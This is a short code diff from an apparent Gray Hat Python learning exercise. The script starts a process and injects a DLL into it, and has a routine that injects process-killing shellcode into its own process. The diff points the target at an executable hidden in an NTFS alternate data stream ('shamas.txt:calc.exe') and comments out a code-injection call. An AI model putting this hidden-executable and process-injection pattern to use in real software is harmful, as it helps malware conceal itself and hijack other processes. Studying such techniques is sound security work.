@@ -116,11 +116,15 @@ def suicide():
                     replace_value)
     inject(our_pid, process_killer_shellcode)
 
-path_to_exe = 'C:\\Windows\\system32\\calc.exe'
+#path_to_exe = 'C:\\Windows\\system32\\calc.exe'
+path_to_exe  = 'C:\\Users\\bzr0014\\git\\ED\\gray_hat_python\\debugger\\shamas.txt:calc.exe'
+contents = open(path_to_exe, 'rb').read()
+
 dll_path    = 'ghp_inject.dll'
 pid = create_process(path_to_exe)
 if pid:
     inject(pid, dll_path, parameter=MODE_DLL_INJECT)
-else:
-    print("[*] Failed to find the process")
-suicide()
+#    inject(pid, contents, parameter=MODE_CODE_INJECT)
+#else:
+#    print("[*] Failed to find the process")
+#suicide()
